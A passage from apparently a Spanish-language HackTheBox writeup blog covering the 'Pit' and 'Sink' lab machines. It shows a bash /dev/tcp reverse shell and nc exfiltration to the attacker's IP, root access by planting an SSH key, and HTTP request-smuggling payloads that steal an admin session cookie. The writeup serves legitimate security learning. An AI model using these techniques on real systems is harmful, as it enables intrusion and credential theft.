-pied^ieY6xoquu seeddms tblUserPasswordRequestnginx@pit:/casita$ mysqldump -u seeddms -pied^ieY6xoquu seeddms tblUsersLa √∫nica que devuelve informaci√≥n es tblUsers, encontramos la password en formato hash MD5, pero al intentar crackearlas solo encontramos resultado con michelle (que seria michelle :P) ‚Ä¶ Jugando con SSH obtenemos este error siempre: ‚ù± ssh michelle@10. 10. 10. 241michelle@10. 10. 10. 241: Permission denied (publickey,gssapi-keyex,gssapi-with-mic). Intentando arreglarlo no lo logramos :( ‚Ä¶ Ejecuci√≥n de comandos en servidor CentOS por medio de la interfaz web #Volviendo atr√°s record√© el login que ten√≠amos contra el servidor CentOS con cockpit, ¬ølo recuerdas? Pues probando esa contrase√±a con el usuario michelle logramos acceder (: Lissssssstones, enumerando un poquito la web encontramos esto: Damos clic y nos muestra esto: Y s√≠, es una terminal, pero no vemos nada de lo que escribimos üôÉ interesante jajaj . __. Intentando comprobar si es funcional logramos cositas: Podemos decirle que nos env√≠e el resultado de un comando a alg√∫n puerto en el que estemos escuchando: Nos ponemos en escucha: nc -lvp 4433. Y ejecutamos (aunque no se vea) el comando id, tomara el resultado y lo enviara al puerto 4433 de nuestra m√°quina: id | nc 10. 10. 14. 146 4433Damos enter y en nuestro listener recibimos: ‚ù± nc -lvp 4433listening on [any] 4433 . . . connect to [10. 10. 14. 146] from pit. htb [10. 10. 10. 241] 34018uid=1000(michelle) gid=1000(michelle) groups=1000(michelle) context=user_u:user_r:user_t:s0Opa, estamos ejecutando comandos como michelle (: comprobando el comando hostname nos devuelve pit. htb y jugando con curL comprobamos que existe el binario, as√≠ que podemos destacar que claramente nginx no ten√≠a permisos contra algunos binarios (por si alguien se lo preguntaba :P) Obtenemos reverse shell como michelle: Nos volvemos a poner en escucha y en la web ejecutamos: bash -c 'bash &gt;&amp; /dev/tcp/10. 10. 14. 146/4433 0&gt;&amp;1'Lo que generara una bash hacia nuestro puerto‚Ä¶ Dando enter obtenemos en nuestro listener: Tenemos una Shell pero bastante fea eh! Lo bueno es que podemos intentar el transformarla en una Full TTY o sea, que sea interactiva y que se vea bonita, hag√°moslo r√°pidamente: Escribimos script /dev/null -c bash: script /dev/null -c bashScript started, file is /dev/null[michelle@pit ~]$La pausamos ejecutando CTRL+Z: [michelle@pit ~]$ ^Z[1]+ Detenido        nc -lvp 4433‚ù± stty raw -echo; fgEscribimos reset y ahora: [michelle@pit ~]$ export TERM=xterm[michelle@pit ~]$ export SHELL=bashPor √∫ltimo abrimos una nueva terminal y ejecutamos stty -a, tomamos esos valores, volvemos a la Shell de michelle y los escribimos en este comando (esos son mis valores): [michelle@pit ~]$ stty rows 43 columns 192Y listo, tenemos una Shell completamente interactiva, es bonita, podemos movernos entre comandos, tenemos hist√≥rico y no nos debemos preocupar si ejecutamos CTRL+C, ya que no la perderemos. ‚Ä¶ Escalada de privilegios #Estando dentro del sistema la enumeraci√≥n nos esta matando, no encontramos nada de nada‚Ä¶ Hasta que record√© lo que hab√≠amos visto con snmpbulkwalk al obtener los usuarios michelle y root, hab√≠a un proceso de monitoreo en ejecuci√≥n y hab√≠a una cadena que hac√≠a referencia a un binario:  /usb/bin/monitor. Busqu√©moslo a ver si tiene algo que ver: [michelle@pit ~]$ ls -la /usr/bin/monitor -rwxr--r--. 1 root root 88 Apr 18 2020 /usr/bin/monitor[michelle@pit ~]$ file /usr/bin/monitor /usr/bin/monitor: Bourne-Again shell script, ASCII text executableEs un script, veamoslo: [michelle@pit ~]$ cat /usr/bin/monitor #!/bin/bashfor script in /usr/local/monitoring/check*shdo  /bin/bash $scriptdoneWTF‚Ä¶ Un bucle que de la ruta /usr/local/monitoring/ toma los archivos que empiecen por check y terminen en sh yyy los ejecuta‚Ä¶ ¬øehhhh? S√≠ esta es la manera de escalar es muy sencillo, ya que simplemente deber√≠amos incluir un archivo en esa ruta con ese inicio, ese final y rogar√≠amos a la virgensita para que root tenga alguna tarea cron o servicio ejecutando /usr/bin/monitor. Veamos si tenemos permisos de escritura con un if sobre la ruta: [michelle@pit ~]$ if [ -w  /usr/local/monitoring  ]; then echo  WRITABLE ; else echo  NOT WRITABLE ; fiWRITABLEBien, al parecer si, para asegurarnos hacemos la f√°cil: [michelle@pit ~]$ echo  holaaaaaaaaaaaaaaa  &gt; /usr/local/monitoring/hola. txt[michelle@pit ~]$ ls -la /usr/local/monitoring/hola. txt-rw-rw-r--. 1 michelle michelle 19 Jun 29 25:25 /usr/local/monitoring/hola. txt[michelle@pit ~]$ cat /usr/local/monitoring/hola. txtholaaaaaaaaaaaaaaaBien, confirmado. Entonces intentemos generar el archivo que colocaremos en esa ruta y veamos si pasa algo. Generamos script que ejecutar√° /usr/bin/monitor üìå: Para validar que el script nos funcione podemos indicarle que haga varias cositas: ‚ù± cat checkea. sh#!/bin/bashid &gt; /home/michelle/id. txtid | nc 10. 10. 14. 146 4435Al ser ejecutado crear√≠a un archivo en la ruta /home/michelle/ llamado id. txt con el contenido del comando id (que deber√≠a ser del usuario root, o el que est√© ejecutando /usr/bin/monitor) y enviar√≠a el mismo resultado, pero a un puerto por el que estaremos escuchando‚Ä¶ ‚ù± nc -lvp 4435Subimos el script: ‚ù± python3 -m http. server[michelle@pit ~]$ mkdir testeando[michelle@pit ~]$ cd testeando/[michelle@pit ~/testeando]$ curl http://10. 10. 14. 146:8000/checkea. sh -o checkea. shAhora d√©mosle permisos de ejecuci√≥n: [michelle@pit ~/testeando]$ chmod +x checkea. shY finalmente lo copiamos a la ruta: [michelle@pit ~/testeando]$ cp checkea. sh /usr/local/monitoring/Ahora deber√≠amos esperar a ver que pasa‚Ä¶ Y no pasa nada‚Ä¶ üòÄ (sonri√≥, pero no sonri√≥ en realidad) Despu√©s de muchas pruebas e intentos logramos ver algo distinto‚Ä¶ Subimos el archivo, lo copiamos a la ruta y todo igual, pero mientras estaba el archivo ah√≠ se me dio por volver a probar el snmpbulkwalk por curiosidad sobre el proceso de ‚Äúmonitoreo‚Äù y vaya vaya: ‚ù± snmpbulkwalk -v2c -c public 10. 10. 10. 241 iso Al menos sabemos que se esta intentando ejecutar el script, pero nos da Permission Denied contra el binario netcat y en la creaci√≥n del archivo id. txt‚Ä¶ De nuevo despu√©s de varias pruebas nos damos cuenta de que /usr/bin/monitor es ejecutado una vez jugamos con snmp‚Ä¶ Yyyy al final, algo nos dio resultado: Podemos probar en guardar nuestra llave p√∫blica SSH en el archivo /root/. ssh/authorized_keys, esto le indicar√° al sistema que a todas las llaves (identificaciones) dentro de ese archivo les permita acceso, pero para obtener ese acceso debemos hacer uso de la llave privada (que ser√≠a el remplazo de una contrase√±a (ya que no la tenemos :P)) asociada a esa llave p√∫blica. Entonces si hacen match la llave p√∫blica guardada en authorized_keys con la llave privada indicada al intentarnos conectar por SSH, nos deber√≠a devolver una Shell como root (porque estamos guardando nuestra ‚Äúcredencial‚Äù en el archivo authorized_keys del usuario root), d√©mosle:  How To Set up SSH Keys on a Linux / Unix System. Primero generamos nuestras llaves (si no las tenemos): (De la forma sencilla) ‚ù± ssh-keygen -t rsaFinalmente deber√≠amos tener estos archivos en la carpeta ~/. ssh: ‚ù± lsid_rsa id_rsa. pub id_rsa es nuestra llave privada (no compartir con nadie).  id_rsa. pub es nuestra llave p√∫blica, esta es la que se usa para poder autenticarnos contra otros sistemas sin necesidad de proveer contrase√±as. Listos, tomamos el contenido de la llave p√∫blica, lo pegamos en el script y le indicamos que tome tooooooooda la llave como una cadena de texto y la agregue en el archivo /root/. ssh/authorized_keys: Ahora, subimos el script, lo copiamos a la ruta y ejecutamos snmpbulkwalk: [michelle@pit ~/testeando]$ curl http://10. 10. 14. 146:8000/checkea. sh -o checkea. sh[michelle@pit ~/testeando]$ chmod +x checkea. sh[michelle@pit ~/testeando]$ cp checkea. sh /usr/local/monitoring/[michelle@pit ~/testeando]$ ls -la /usr/local/monitoring/checkea. sh-rwxrwxr-x. 1 michelle michelle 612 Jun 29 25:25 /usr/local/monitoring/checkea. sh‚ù± snmpbulkwalk -v2c -c public 10. 10. 10. 241 isoNo vemos ning√∫n problema (al parecer): Intentamos ahora conectarnos por SSH pas√°ndole nuestra llave privada como identificaci√≥n: ‚ù± ssh root@10. 10. 10. 241 -i ~/. ssh/id_rsaYyyyyyyyyyyyyyyyy‚Ä¶ TAMOOOOOOOOOOOOOOOOOOOOOOS DENTROOOOOOOOO DE LA M√ÅQUINAAAAAAAAAAAAA COMOOOO ROOOOOOT!! Veamos las flags‚Ä¶ FIN!! NO VA M√ÅS!! ‚Ä¶ Dios, fue una m√°quina bastante, ihss, no s√©, muy poco amigable jjaajaj, pero bueno, se aprendi√≥, se hizo un lindo script y pensamos mucho lateralmente. La parte del script (privesc) fue algo extra√±a. Lo que me gusto es que todo lo que encontramos se us√≥, as√≠ que bien ah√≠!! Y bueno, nos leeremos en otros rincones de tu mente, descansa (de verdad) pero recuerda, a seguir ROMPIENDO todoooooooooooo! "
    }, {
    "id": 16,
    "url": "http://localhost:4000/htb/sink",
    "title": "HackTheBox - Sink",
    "body": "2021/09/18 - M√°quina Linux nivel desquiciado. Nos enfrentaremos a un HTTP Request Smuggling (loco loco), saltaremos entre usuarios a√∫n m√°s locos, veremos commits relacionados a pasos a producci√≥n y pruebas extra√±as con üîëüîë, jugaremos bastante con AWS CLI, encontraremos secretos :O y finalmente desencriptaremos un archivo tambi√©n jugando con AWS y llaves KMS.  TL;DR (Spanish writeup): Creada por: MrR3boot. Desquiceddd! Este writeup es largito (m√°s que nada por los bloques de c√≥digo), as√≠ que cafecito y a rompernos la cabeza‚Ä¶  Muy linda m√°quina. Nos encontraremos con dos servicios, uno corriendo Gitea y otro Gunicorn, en el camino nos veremos las caras con un HTTP request smuggling el cual nos permitir√° interceptar la cookie de sesi√≥n del usuario admin@sink. htb. La usaremos para entrar en un panel y encontrar unas notas, cada una tiene una credencial, una de ellas nos permitir√° entrar al servicio Gitea referenciado antes. Veremos unos repositorios, commits y dem√°s info. En uno de los commits el usuario marcus estaba haciendo pruebas con su llave SSH privada y nos dej√≥ el rastro. Usaremos esa llave para entrar en la m√°quina como √©l. Empezaremos a jugar con AWS CLI para ver logs y secretos, en el jugueteo :o encontraremos otras credenciales guardadas como eso, secretos. Una de ellas pertenecen al usuario david y nos permitir√°n generar una sesi√≥n como √©l tanto en Gitea como en la m√°quina. David en sus archivos tiene uno llamado servers. enc y esta encriptado mediante aws. Seguiremos jugando con AWS-CLI, pero ahora con kms para interactuar con keyIds y buscar la manera de desencriptar el archivo valid√°ndolo contra distintas llaves que iremos encontrando. Finalmente encontraremos una llave que nos devuelve una cadena en base64, la tomamos y guardamos en un archivo, el tipo de archivo generado es un comprimido gzip, usaremos zcat para descubrir que contiene el archivo servers. yml, veremos otras credenciales en este caso de un usuario llamado admin. Nos servir√°n para generar una Shell como el usuario root. ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Muuuuuuuuuy real, alguna que otra cosita conocida pero sobre todo demasiada enumeraci√≥n (mucha lectura y b√∫squeda).  Escribo para tener mis ‚Äúnotas‚Äù, por si algun d√≠a se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Vuelve que el dolor me mata.  Reconocimiento.      Usamos nmap para descubrir los puertos que tiene abiertos la m√°quina.     Enumeraci√≥n.      Recorremos el servicio web corriendo en el puerto 3000.    Descubrimos que hay en el servicio web del puerto 5000.     Explotaci√≥n.      Encontramos cositas al interceptar las peticiones con BurpSuite.    Robamos cookies del usuario admin explotando un HTTP Request Smuggling.    Encontramos cositas siendo el usuario admin en la web.    Enumeramos el servicio del puerto 3000 (Gitea) como el usuario root.     Movimiento Lateral (AWSecrets).  Escalada de privilegios. ‚Ä¶ Reconocimiento #‚Ä¶ Usamos nmap para descubrir puertos abiertos üìå: Realizaremos un escaneo de puertos para saber que servicios esta corriendo la m√°quina: ‚ù≠ nmap -p- --open -v 10. 10. 10. 225 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escaneamos todos los 65535 puertos.        ‚Äìopen   Solo los puertos que est√©n abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 225# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 225 ()  Status: UpHost: 10. 10. 10. 225 ()  Ports: 22/open/tcp//ssh///, 3000/open/tcp//ppp///, 5000/open/tcp//upnp///# Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 90. 06 secondsPerfecto, nos encontramos los puertos y servicios:       Puerto   Descripci√≥n         22   SSH: Tenemos la posibilidad de obtener una Shell de manera segura.        3000   PPP: No lo sabemos a√∫n.        5000   UPnP: Conjunto de protocolos para la comunicaci√≥n de perif√©ricos en la red.    Hagamos un escaneo de scripts y versiones con base en cada servicio (puerto), con ello obtenemos informaci√≥n m√°s detallada de cada uno: ‚ù≠ nmap -p 22,3000,5000 -sC -sV 10. 10. 10. 225 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos.        -sC   Muestra todos los scripts relacionados con el servicio.        -sV   Nos permite ver la versi√≥n del servicio.        -oN   Guarda el output en un archivo.    Obtenemos: # Nmap 7. 80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p 22,3000,5000 -sC -sV -oN portScan 10. 10. 10. 225Nmap scan report for 10. 10. 10. 225Host is up (0. 20s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1 (Ubuntu Linux; protocol 2. 0)3000/tcp open ppp?| fingerprint-strings: |  GenericLines, Help: |   HTTP/1. 1 400 Bad Request|   Content-Type: text/plain; charset=utf-8|   Connection: close|   Request|  GetRequest: |   HTTP/1. 0 200 OK|   Content-Type: text/html; charset=UTF-8|   Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647|   Set-Cookie: i_like_gitea=1f3e9a13ee13832b; Path=/; HttpOnly|   Set-Cookie: _csrf=Aq4ydKpCQiIxK9nMLskgSeyGzwI6MTYxMzU3NjcxMDE1ODI4NzczNQ; Path=/; Expires=Thu, 18 Feb 2021 15:45:10 GMT; HttpOnly|   X-Frame-Options: SAMEORIGIN|   Date: Wed, 17 Feb 2021 15:45:10 GMT|   &lt;!DOCTYPE html&gt;|   &lt;html lang= en-US  class= theme- &gt;|   &lt;head data-suburl=  &gt;|   &lt;meta charset= utf-8 &gt;|   &lt;meta name= viewport  content= width=device-width, initial-scale=1 &gt;|   &lt;meta http-equiv= x-ua-compatible  content= ie=edge &gt;|   &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;|   &lt;link rel= manifest  href= /manifest. json  crossorigin= use-credentials &gt;|   &lt;meta name= theme-color  content= #6cc644 &gt;|   &lt;meta name= author  content= Gitea - Git with a cup of tea  /&gt;|   &lt;meta name= description  content= Gitea (Git with a cup of tea) is a painless|  HTTPOptions: |   HTTP/1. 0 404 Not Found|   Content-Type: text/html; charset=UTF-8|   Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647|   Set-Cookie: i_like_gitea=4962a49b06cbe2fd; Path=/; HttpOnly|   Set-Cookie: _csrf=VEhuM5Nh9ZTyY63RRBsfaoun5dI6MTYxMzU3NjcxNjE4MjM4NjQzMg; Path=/; Expires=Thu, 18 Feb 2021 15:45:16 GMT; HttpOnly|   X-Frame-Options: SAMEORIGIN|   Date: Wed, 17 Feb 2021 15:45:16 GMT|   &lt;!DOCTYPE html&gt;|   &lt;html lang= en-US  class= theme- &gt;|   &lt;head data-suburl=  &gt;|   &lt;meta charset= utf-8 &gt;|   &lt;meta name= viewport  content= width=device-width, initial-scale=1 &gt;|   &lt;meta http-equiv= x-ua-compatible  content= ie=edge &gt;|   &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;|   &lt;link rel= manifest  href= /manifest. json  crossorigin= use-credentials &gt;|   &lt;meta name= theme-color  content= #6cc644 &gt;|   &lt;meta name= author  content= Gitea - Git with a cup of tea  /&gt;|_  &lt;meta name= description  content= Gitea (Git with a c5000/tcp open http  Gunicorn 20. 0. 0|_http-server-header: gunicorn/20. 0. 0|_http-title: Sink Devops1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port3000-TCP:V=7. 80%I=7%D=2/17%Time=602D37C4%P=x86_64-pc-linux-gnu%r(GeSF:nericLines,67, . . .  );Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 108. 67 secondsBien, tenemos varias cositas:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1       3000   PPP (Al parecer HTTP)   -    Tiene varias referencias hacia Gitea.  Vemos 2 cookies y una relacionada a gitea.       Puerto   Servicio   Versi√≥n         5000   HTTP   Gunicorn 20. 0. 0   Nada m√°s por ahora, as√≠ que empecemos a validar cada servicio y ver por donde podemos jugar‚Ä¶ ‚Ä¶ Enumeraci√≥n #‚Ä¶ Recorremos el puerto 3000 üìå: Listos, confirmamos el servicio Gitea. ü¶† B√°sicamente nos permite alojar control de versiones usando Git y es un fork (copia) de Gogs (que nos ayuda a correr nuestro propio servicio Git, mejor dicho, tener nuestro propio GitHub), pero mejorado y para toda la familia.  Gitea, la versi√≥n mejorada de Gogs.  Comparativa entre varios servicios de Git hosting. Vale, entonces enumeremos a ver que sacamos‚Ä¶ Si vamos al apartado explore tenemos 3 √≠tems, veamos users:  Usuario: david.  Usuario: marcus.  Usuario: root.  Versi√≥n Gitea: 1. 12. 6.  Versi√≥n Go: 1. 14. 12. Validando cada usuario, vemos que todos est√°n asociados a una organizaci√≥n, Sink_Solutions, en Organizations la encontramos:  Tambi√©n podemos logearnos, probando con los usuarios y posibles contrase√±as no conseguimos nada‚Ä¶ Buscando vulnerabilidades con las versiones relacionadas encontramos una que posiblemente (no creo :P) est√© relacionada, pero debemos estar autenticados, guard√©mosla por si algo:  Gitea-1. 12. 6: Authenticated remote code execution via git hooks (CVE-2020-14144). ‚Ä¶ Recorremos el puerto 5000 üìå: ü¶Ñ Gunicorn (Green Unicorn) is a Python WSGI HTTP Server for UNIX. It‚Äôs a pre-fork worker model compatible with various web frameworks, simple and lightweight server. musyokaian. Pero khe jeso de WSGI, r√°pidamente: ‚öôÔ∏è WSGI permite que programas hechos en Python puedan comunicarse a trav√©s del protocolo HTTP sin ning√∫n tipo de framework o librer√≠a. codigofacilito.  Tenemos un login panel, pero tambi√©n nos podemos registrar, d√©mosle‚Ä¶   Tenemos un correo: admin@sink. htb. Bien, pa que lo sepamos: En el apartado notes nos permite agregar, ver y borrar notas:   Son notas que cree para probar algun tipo de injecci√≥n o brecha. Pero por el momento nada‚Ä¶ ‚Ä¶ Explotaci√≥n # Jugando para entender la explotaci√≥n.  Explotaci√≥n final de algo muy lococh√≥n. ‚Ä¶ Encontramos un vector de ataque muuuy potencial üìå: Bueno bueno bueeeeeeeeeeno‚Ä¶ Despu√©s de dar vueltas por las p√°ginas con BurpSuite interceptando las peticiones del servidor http://10. 10. 10. 25:5000, notamos algo llamativo: Esta usando un proxy llamado HAProxy entre las peticiones, pues veamos que se trata: üöá HAProxy es un balanceador de cargas (load balancer: transfiere peticiones entre host para evitar colapsos y hacer que sean procesadas m√°s r√°pido) entre servidores.  YT - Balanceador de carga con HAProxy.  HAProxy en Wikipedia.  Balanceadores de carga, mejora el rendimiento de tu web. Teniendo esto claro, validemos si existen vulnerabilidades hacia ese servicio‚Ä¶ Inicialmente nos encontramos con el CVE CVE-2020-11100, el cual apoyado del protocolo HTTP/2 (para hacer un uso m√°s eficiente de los recursos en la red) puede permitirle al atacante enviar una petici√≥n ‚Äúespecial‚Äù, que puede generar un heap-based buffer overflow y finalmente una ejecuci√≥n remota de comandos en el sistema.  Heap-based Buffer Overflow? - cwe. mitre. org.  Desbordamiento de mont√≠culo (heap) - Wikipedia. Es una vulnerabilidad descubierta por Felix Wilhelm (integrante del grupo de hackers de Google (Project Zero)), en el blog oficial de HAProxy nos redireccionan al writeup creado por √©l:  HAProxy Security Update HTTP/2 HPACK - haproxy. com.  HAProxy: out-of-bounds-write in HTTP/2 - bugs. chromium. org. D√°ndole vistazos a otros recursos y temas relacionados a esa vuln, no logre interactuar con ella‚Ä¶ ‚Ä¶ Buscando y buscando encontr√© un PoC en formato de video explotando una vulnerabilidad llamada: HTTP Request SmugglingY que afecta a HAProxy, esta tiene relacionado el CVE CVE-2019-18277.  YT - HTTP Request Smuggling explain on HAProxy CVE-2019-18277. Antes de probar la vuln, entendamos (o intent√©moslo) sobre HTTP Request Smuggling. ¬øQu√© es un HTTP Request Smuggling? (Descubr√°moslo) ü™ï: Como indica Busra Demir en su art√≠culo, HTTP request smuggling es una t√©cnica la cual interfiere en el proceso por el que pasan las peticiones del front al back. Donde el atacante puede modificar la petici√≥n para incluir otra en la misma petici√≥n. Lo que pasara es que ejecutara la primera petici√≥n normalmente, pero al terminar de procesarla ejecutara la segunda que tenemos incrustada, logrando as√≠ el √©xito de la vulnerabilidad. Esto se logra modificando/agregando 2 headers HTTP: * Content-Length Header: the size of the request body (in bytes). * Transfer-Encoding Header: specified as chunked so that the request body will be sent in chunks (separated by newline). 0 is used to end a chunk.  Pentester guide to HTTP Request Smuggling. Pero ¬øpara qu√© nos sirve esto? Como explica portswigger nos puede permitir bypassear controles de seguridad, obtener acceso a informaci√≥n sensible yyyy comprometer otros usuarios que est√©n en la aplicaci√≥n.   Tomada de What is HTTP request smuggling? - portswigger. ‚Ä¶ Ahora s√≠, sigamos y probemos si nuestra versi√≥n es vulnerable a HTTP Request Smuggling‚Ä¶ Siguiendo algunos ejemplos de referencias anteriores y de este art√≠culo, logramos obtener la versi√≥n de HAProxy que esta usando el servidor:  The Powerfull HTTP Request Smuggling - medium. com/ricardoiramar. Si enviamos la siguiente petici√≥n:  Enviamos la data en formato chunked (separada por \n (newline)).  El total de la traza serian 9 caracteres (note=hola).  Con 0 le indicamos el final de la data en formato chunk. Obtenemos la versi√≥n concreta de HAProxy:  HAProxy Version 1. 9. 10 Bueno, pues podemos enfocarnos un poco m√°s. Quiz√°s esta sea la ruta adecuada para la explotaci√≥n. Sigamos validando si podemos explotar la web mediante el smuggling‚Ä¶ En las referencias del CVE, encontramos este PoC:  HAProxy HTTP Request Smuggling. D√°ndole unas vueltas nos indica algo necesario para la correcta explotaci√≥n:  The backend must also support HTTP keep-alive. As√≠ que debemos cambiar el header Connection: close a Connection: keep-alive. D√©mosle a la locura, modifiquemos la petici√≥n incrustando otra solicitud a ver que recibimos: POST /notes HTTP/1. 1Host: 10. 10. 10. 225:5000User-Agent: Mozilla/5. 0 (Windows NT 10. 0; rv:68. 0) Gecko/20100101 Firefox/68. 0Accept: text/html,application/xhtml+xml,application/xml;q=0. 9,image/webp,*/*;q=0. 8Accept-Language: en-US,en;q=0. 5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 259                        &lt;!-- original --&gt;Origin: http://10. 10. 10. 225:5000DNT: 1Connection: keep-aliveReferer: http://10. 10. 10. 225:5000/notesCookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ. YDUzCA. YVpcMp8dXmocfLzRQa8HEFDUp_8Upgrade-Insecure-Requests: 1Sec-GPC: 1Transfer-Encoding: chunked9note=hola0POST /notes HTTP/1. 1Host: 10. 10. 10. 225:5000Content-Type: application/x-www-form-urlencoded          &lt;!-- smuggling --&gt;Content-Length: 251Connection: keep-aliveCookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ. YDUzCA. YVpcMp8dXmocfLzRQa8HEFDUp_8note=holas Y validamos el apartado /notes, tenemos: Nada :P üòÇ ‚Ä¶ Logramos la explotaci√≥n del HTTP Request Smuggling üìå: Revisando de nuevo el post, nos dice que muchas veces el chunked no es tomado y debemos agregarle al inicio de ese header la cadena \x0b (hexadecimal) para que lo interprete. Despu√©s de jugar con √©l, intentando agregarlo a la petici√≥n, obten√≠amos lo mismo. Peeeeeeero era porque lo estaba haciendo mal. Si pasamos el valor hexadecimal a base64 externamente (nosotros mismos) y despu√©s en Burp usamos el convertidor interno de base64 al valor original, ah√≠ si logramos ver el \x0b reflejado:  Pasar 0b a base64: Cw==.  Pegar Cw== en la petici√≥n, seleccionarlo y decodearlo de base64 a valor original: Seleccionamos la cadena Cw== y hacemos: Clic derecho &gt; Convert-Selection &gt; Base64 &gt; Base64-decode (o de la forma corta: CTRL + SHIFT + B)Y obtenemos: POST /notes HTTP/1. 1Host: 10. 10. 10. 225:5000User-Agent: Mozilla/5. 0 (Windows NT 10. 0; rv:68. 0) Gecko/20100101 Firefox/68. 0Accept: text/html,application/xhtml+xml,application/xml;q=0. 9,image/webp,*/*;q=0. 8Accept-Language: en-US,en;q=0. 5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded            &lt;!-- original --&gt;Content-Length: 259Origin: http://10. 10. 10. 225:5000DNT: 1Connection: keep-aliveReferer: http://10. 10. 10. 225:5000/notesCookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ. YDUzCA. YVpcMp8dXmocfLzRQa8HEFDUp_8Upgrade-Insecure-Requests: 1Sec-GPC: 1Transfer-Encoding:chunked9note=hola0POST /notes HTTP/1. 1Host: 10. 10. 10. 225:5000Content-Type: application/x-www-form-urlencoded            &lt;!-- smuggling --&gt;Content-Length: 251Connection: keep-aliveCookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ. YDUzCA. YVpcMp8dXmocfLzRQa8HEFDUp_8note=holasPerfecto, validemos si cambia algo ahora‚Ä¶ Nos genera dos notas, una esta vac√≠a y la otra llenita :P Veamos la llenita claramente: Vale vale valeeeeeeeeeee, que es esta locuraaaaaaaaaaaa‚Ä¶ Tenemos una nueva cookie de alg√∫n usuario (o pues al menos es diferente a la nuestra) corriendo el servicio sobre el localhost. Viendo lo que tenemos podemos intuir que esta pasando:  (Esto puede sonar enrredado (supongo) pero es lo que entiendo que paso) üö® Normalmente (como vimos en las explicaciones anteriores) queremos ingresar a alg√∫n recurso al que no tengamos acceso. Como en este caso no sabemos a cu√°l, lo lanzamos contra el mismo recurso. Vemos que se efect√∫a nuestro intento, logrando as√≠ interceptar la otra petici√≥n, pero obteniendo la respuesta en el mismo recurso que usamos para enviarla (o sea, en /notes) La petici√≥n es un delete a la nota 1234 (/notes/delete/1234) pero ejecutada desde el localhost por el puerto 8080 y claramente por un usuario interno, lo sabemos por qu√© obtenemos una Cookie distinta a la nuestra. Podemos usarla para cambiar la que tenemos por esa, recargar la p√°gina y ver con quien estamos (si es que cambiamos a otro usuario)‚Ä¶ GET /notes/delete/1234 HTTP/1. 1Host: 127. 0. 0. 1:8080 User-Agent: Mozilla/5. 0 (Windows NT 10. 0; rv:78. 0) Gecko/20100101 Firefox/78. 0Accept-Encoding: gzip, deflateAccept: */*Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0. YDSQAA. _gPero si notamos el tama√±o de la cookie es m√°s corto (la comparamos con la nuestra), agregu√©mosle m√°s buffer, simplemente cambiando el valor de la cabecera a Content-Length: 250 por ejemplo y veamos la respuesta ahora:  (Justo ac√° reiniciaron la m√°quina, pero pues lo unico que cambiaran seran las cookies, tanto la mia como la que obtengamos) La respuesta que tenemos en la nueva nota es: Nada . _ . Si ponemos m√°s de 308 como tama√±o volvemos a obtener solo una nota, entonces podemos borrar el contenido de note= (para liberar espacio) y coloquemos Content-Length: 303 (despu√©s de alg√∫n tanteo): POST /notes HTTP/1. 1Host: 10. 10. 10. 225:5000User-Agent: Mozilla/5. 0 (Windows NT 10. 0; rv:68. 0) Gecko/20100101 Firefox/68. 0Accept: text/html,application/xhtml+xml,application/xml;q=0. 9,image/webp,*/*;q=0. 8Accept-Language: en-US,en;q=0. 5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 254Origin: http://10. 10. 10. 225:5000DNT: 1Connection: keep-aliveReferer: http://10. 10. 10. 225:5000/notesCookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ. YDWNyg. naJPYMmG6_8HKfdGqeeJMTwjVR4Upgrade-Insecure-Requests: 1Sec-GPC: 1Transfer-Encoding:chunked9note=hola0POST /notes HTTP/1. 1Host: 10. 10. 10. 225:5000Content-Type: application/x-www-form-urlencodedContent-Length: 303Connection: keep-aliveCookie: session=eyJlbWFpbCI6ImxhbnpAc2luay5odGIifQ. YDWNyg. naJPYMmG6_8HKfdGqeeJMTwjVR4note=Y obtenemos ahora si en la nota: GET /notes/delete/1234 HTTP/1. 1 Host: 127. 0. 0. 1:8080 User-Agent: Mozilla/5. 0 (Windows NT 10. 0; rv:78. 0) Gecko/20100101 Firefox/78. 0 Accept-Encoding: gzip, deflate Accept: */* Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0. YDWL9A. dG5uqF6Y8oZfi7uQi3IATStQVIA X-Forwarded-For: 127. 0. 0. 1Perfecto, ahora si es del tama√±o adecuado :)  (Volvieron a reiniciar la m√°quinaüòê) Tomemos la cookie. Yo usare la extensi√≥n de Firefox llamada Cookie-Editor (que nos permite jugar con las cookies claramente :P) 